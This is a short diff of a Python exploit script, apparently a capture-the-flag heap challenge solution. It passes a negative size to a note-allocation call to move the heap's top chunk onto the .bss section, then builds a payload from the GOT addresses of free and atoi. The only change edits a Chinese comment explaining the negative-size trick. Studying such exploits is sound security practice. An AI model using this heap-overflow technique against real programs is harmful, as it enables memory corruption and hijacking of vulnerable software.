@@ -58,7 +58,7 @@ if __name__=="__main__":
 	bss_address=  0x804B118 - 8
 	#size = 0x10804B118 - top_chunk
 	size = top_chunk - bss_address   #使其分配到bss上存放note的地址，后续可操作每个note
-	new_note(-size,"test")   #修改top_chunk的地址
+	new_note(-size,"test")   #修改top_chunk的地址，传入负数，malloc有atoi先进行转化
 	
 	payload = p32(elf.got["free"])
 	payload += p32(elf.got["atoi"])
